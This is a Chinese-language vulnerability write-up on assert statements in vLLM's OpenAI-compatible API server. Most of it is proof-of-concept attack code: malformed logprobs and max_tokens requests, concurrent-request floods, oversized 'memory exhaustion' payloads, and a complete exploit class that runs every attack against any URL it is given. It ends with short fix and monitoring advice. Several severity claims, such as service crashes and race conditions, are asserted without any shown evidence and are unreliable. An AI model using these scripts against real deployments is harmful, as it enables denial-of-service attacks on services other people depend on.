# vLLM Assert 语句漏洞详细分析与PoC构建

## 1. Assert 语句漏洞概述

在生产环境中，Python的assert语句在使用`-O`优化标志时会被完全移除，但在正常模式下会导致AssertionError异常。vLLM项目中存在大量assert语句，这些语句在特定条件下可能导致服务崩溃。

## 2. 关键Assert语句分析

### 2.1 Logprobs相关Assert (高危)

**位置**: `vllm/entrypoints/openai/serving_chat.py:586, 975`

```python
# 流式响应中的assert
if request.logprobs and request.top_logprobs is not None:
    assert output.logprobs is not None, "Did not output logprobs"

# 完整响应中的assert  
if request.logprobs and request.top_logprobs is not None:
    assert out_logprobs is not None, "Did not output logprobs"
```

**触发条件**:
- `request.logprobs = True`
- `request.top_logprobs > 0`
- 但引擎返回的`output.logprobs`为`None`

### 2.2 Max_tokens相关Assert (高危)

**位置**: `vllm/entrypoints/openai/serving_completion.py:370, 508`

```python
assert request.max_tokens is not None
```

**触发条件**:
- 请求中`max_tokens`字段为`None`
- 但代码逻辑期望其不为`None`

### 2.3 Final_res相关Assert (中危)

**位置**: `vllm/entrypoints/openai/serving_chat.py:965, 1129`

```python
assert final_res is not None
assert final_res.prompt_token_ids is not None
```

**触发条件**:
- 生成器未返回结果
- 或返回的结果缺少必要字段

### 2.4 Generators数量Assert (中危)

**位置**: `vllm/entrypoints/openai/serving_chat.py:270`

```python
assert len(generators) == 1
```

**触发条件**:
- 生成器数量不等于1

## 3. PoC构建

### 3.1 Logprobs Assert攻击PoC

这是最容易触发的assert漏洞：

```python
import requests
import json

# PoC 1: Logprobs Assert攻击
def poc_logprobs_assert():
    """
    触发logprobs相关的assert失败
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    # 构造恶意请求
    payload = {
        "model": "test-model",
        "messages": [
            {"role": "user", "content": "Hello"}
        ],
        "logprobs": True,        # 设置为True
        "top_logprobs": 1,       # 设置为正数
        "max_tokens": 10,
        "temperature": 0.0
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

# PoC 2: 流式响应中的logprobs攻击
def poc_streaming_logprobs_assert():
    """
    在流式响应中触发logprobs assert
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    payload = {
        "model": "test-model", 
        "messages": [
            {"role": "user", "content": "Generate a long response"}
        ],
        "logprobs": True,
        "top_logprobs": 5,       # 更大的数值增加失败概率
        "stream": True,          # 启用流式响应
        "max_tokens": 100
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, stream=True)
        for line in response.iter_lines():
            if line:
                print(line.decode('utf-8'))
    except Exception as e:
        print(f"Streaming error: {e}")
```

### 3.2 Max_tokens Assert攻击PoC

```python
def poc_max_tokens_assert():
    """
    触发max_tokens相关的assert失败
    """
    url = "http://localhost:8000/v1/completions"
    
    # 构造缺少max_tokens的请求
    payload = {
        "model": "test-model",
        "prompt": "Hello world",
        "echo": True,            # 启用echo模式
        # 故意不设置max_tokens
        "temperature": 0.0
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

# 另一种触发方式
def poc_max_tokens_none_assert():
    """
    通过设置max_tokens为None触发assert
    """
    url = "http://localhost:8000/v1/completions"
    
    payload = {
        "model": "test-model",
        "prompt": "Hello",
        "max_tokens": None,      # 显式设置为None
        "echo": True
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers)
        print(f"Status: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error: {e}")
```

### 3.3 组合攻击PoC

```python
def poc_combined_assert_attack():
    """
    组合多个assert触发条件的攻击
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    # 构造复杂的恶意请求
    payload = {
        "model": "non-existent-model",  # 可能导致final_res为None
        "messages": [
            {"role": "user", "content": ""}  # 空内容
        ],
        "logprobs": True,
        "top_logprobs": 10,             # 大数值
        "max_tokens": None,             # None值
        "stream": True,
        "temperature": 0.0,
        "n": 2                          # 多个选择可能影响generators数量
    }
    
    headers = {
        "Content-Type": "application/json"
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, stream=True)
        for line in response.iter_lines():
            if line:
                print(line.decode('utf-8'))
    except Exception as e:
        print(f"Combined attack error: {e}")
```

### 3.4 竞态条件攻击PoC

```python
import threading
import time

def poc_race_condition_assert():
    """
    通过并发请求触发竞态条件导致的assert失败
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    def send_request(thread_id):
        payload = {
            "model": "test-model",
            "messages": [
                {"role": "user", "content": f"Request from thread {thread_id}"}
            ],
            "logprobs": True,
            "top_logprobs": 1,
            "max_tokens": 1,
            "stream": True
        }
        
        try:
            response = requests.post(url, json=payload, stream=True)
            print(f"Thread {thread_id}: Status {response.status_code}")
        except Exception as e:
            print(f"Thread {thread_id}: Error {e}")
    
    # 创建多个线程同时发送请求
    threads = []
    for i in range(10):
        t = threading.Thread(target=send_request, args=(i,))
        threads.append(t)
        t.start()
    
    # 等待所有线程完成
    for t in threads:
        t.join()
```

## 4. 高级攻击场景

### 4.1 内存耗尽 + Assert攻击

```python
def poc_memory_exhaustion_assert():
    """
    结合内存耗尽攻击和assert触发
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    # 构造大量数据的请求
    large_content = "A" * 100000  # 100KB的内容
    
    payload = {
        "model": "test-model",
        "messages": [
            {"role": "user", "content": large_content}
        ] * 10,  # 多条大消息
        "logprobs": True,
        "top_logprobs": 20,          # 大数值
        "max_tokens": 1000,
        "stream": True
    }
    
    try:
        response = requests.post(url, json=payload, stream=True)
        for line in response.iter_lines():
            if line:
                print("Received data...")
                break
    except Exception as e:
        print(f"Memory exhaustion + assert error: {e}")
```

### 4.2 工具调用 + Assert攻击

```python
def poc_tool_call_assert():
    """
    通过工具调用触发assert失败
    """
    url = "http://localhost:8000/v1/chat/completions"
    
    payload = {
        "model": "test-model",
        "messages": [
            {"role": "user", "content": "Use a tool"}
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "test_function",
                    "description": "A test function"
                }
            }
        ],
        "tool_choice": "auto",
        "logprobs": True,
        "top_logprobs": 1,
        "stream": True
    }
    
    try:
        response = requests.post(url, json=payload, stream=True)
        for line in response.iter_lines():
            if line:
                print(line.decode('utf-8'))
    except Exception as e:
        print(f"Tool call assert error: {e}")
```

## 5. 完整的攻击脚本

```python
#!/usr/bin/env python3
"""
vLLM Assert Vulnerability PoC
针对vLLM项目中assert语句的漏洞利用脚本
"""

import requests
import json
import threading
import time
import sys

class VLLMAssertExploit:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_server_availability(self):
        """测试服务器是否可用"""
        try:
            response = self.session.get(f"{self.base_url}/v1/models")
            return response.status_code == 200
        except:
            return False
    
    def exploit_logprobs_assert(self):
        """利用logprobs assert漏洞"""
        print("[*] Testing logprobs assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        payload = {
            "model": "test-model",
            "messages": [{"role": "user", "content": "Hello"}],
            "logprobs": True,
            "top_logprobs": 1,
            "max_tokens": 10
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            print(f"[+] Response status: {response.status_code}")
            if response.status_code == 500:
                print("[!] Potential assert failure detected!")
                print(f"[!] Response: {response.text[:200]}...")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def exploit_streaming_logprobs_assert(self):
        """利用流式响应中的logprobs assert漏洞"""
        print("[*] Testing streaming logprobs assert vulnerability...")
        
        url = f"{self.base_url}/v1/chat/completions"
        payload = {
            "model": "test-model",
            "messages": [{"role": "user", "content": "Generate text"}],
            "logprobs": True,
            "top_logprobs": 5,
            "stream": True,
            "max_tokens": 50
        }
        
        try:
            response = self.session.post(url, json=payload, stream=True, timeout=10)
            for line in response.iter_lines():
                if line:
                    line_str = line.decode('utf-8')
                    if "error" in line_str.lower():
                        print("[!] Error detected in streaming response!")
                        print(f"[!] Error line: {line_str}")
                        return True
            return False
        except Exception as e:
            print(f"[-] Streaming error: {e}")
            return False
    
    def exploit_max_tokens_assert(self):
        """利用max_tokens assert漏洞"""
        print("[*] Testing max_tokens assert vulnerability...")
        
        url = f"{self.base_url}/v1/completions"
        payload = {
            "model": "test-model",
            "prompt": "Hello world",
            "echo": True,
            # 故意不设置max_tokens
        }
        
        try:
            response = self.session.post(url, json=payload, timeout=10)
            print(f"[+] Response status: {response.status_code}")
            if response.status_code == 500:
                print("[!] Potential max_tokens assert failure!")
                print(f"[!] Response: {response.text[:200]}...")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def exploit_concurrent_assert(self):
        """并发攻击触发assert失败"""
        print("[*] Testing concurrent assert vulnerability...")
        
        def send_malicious_request(thread_id):
            url = f"{self.base_url}/v1/chat/completions"
            payload = {
                "model": "test-model",
                "messages": [{"role": "user", "content": f"Thread {thread_id}"}],
                "logprobs": True,
                "top_logprobs": 1,
                "stream": True
            }
            
            try:
                response = self.session.post(url, json=payload, stream=True)
                if response.status_code != 200:
                    print(f"[!] Thread {thread_id}: Status {response.status_code}")
            except Exception as e:
                print(f"[!] Thread {thread_id}: Exception {e}")
        
        threads = []
        for i in range(5):
            t = threading.Thread(target=send_malicious_request, args=(i,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        print("[+] Concurrent test completed")
    
    def run_all_exploits(self):
        """运行所有漏洞利用"""
        print("="*60)
        print("vLLM Assert Vulnerability PoC")
        print("="*60)
        
        if not self.test_server_availability():
            print("[-] Server not available at", self.base_url)
            return False
        
        print("[+] Server is available")
        
        # 运行各种攻击
        self.exploit_logprobs_assert()
        time.sleep(1)
        
        self.exploit_streaming_logprobs_assert()
        time.sleep(1)
        
        self.exploit_max_tokens_assert()
        time.sleep(1)
        
        self.exploit_concurrent_assert()
        
        print("\n[*] All exploits completed")
        return True

if __name__ == "__main__":
    # 使用方法
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8000"
    
    exploit = VLLMAssertExploit(base_url)
    exploit.run_all_exploits()
```

## 6. 漏洞影响评估

### 6.1 影响范围
- **服务可用性**: assert失败导致服务崩溃
- **资源消耗**: 异常处理消耗额外资源
- **信息泄露**: AssertionError可能暴露内部状态

### 6.2 攻击成本
- **技术门槛**: 低 - 只需构造简单的HTTP请求
- **资源需求**: 低 - 单个请求即可触发
- **检测难度**: 中 - 需要分析服务器响应

### 6.3 实际利用场景
1. **DoS攻击**: 批量发送触发assert的请求
2. **服务探测**: 通过assert错误判断服务器状态
3. **资源耗尽**: 结合其他攻击手段消耗服务器资源

## 7. 修复建议

### 7.1 立即修复
```python
# 将assert替换为显式检查
# 原代码:
assert output.logprobs is not None, "Did not output logprobs"

# 修复后:
if output.logprobs is None:
    logger.error("Did not output logprobs")
    return self.create_error_response("Internal error: logprobs not available")
```

### 7.2 长期改进
1. 建立统一的错误处理机制
2. 使用自定义异常类型
3. 添加输入验证和边界检查
4. 实施优雅的错误恢复机制

## 8. 检测和防护

### 8.1 监控指标
- AssertionError异常频率
- 500错误响应率
- 异常请求模式

### 8.2 防护措施
- 输入验证和清理
- 请求频率限制
- 异常监控和告警
- 优雅的错误处理

这些assert语句漏洞是实际存在的高风险安全问题，需要立即修复以防止生产环境中的服务中断。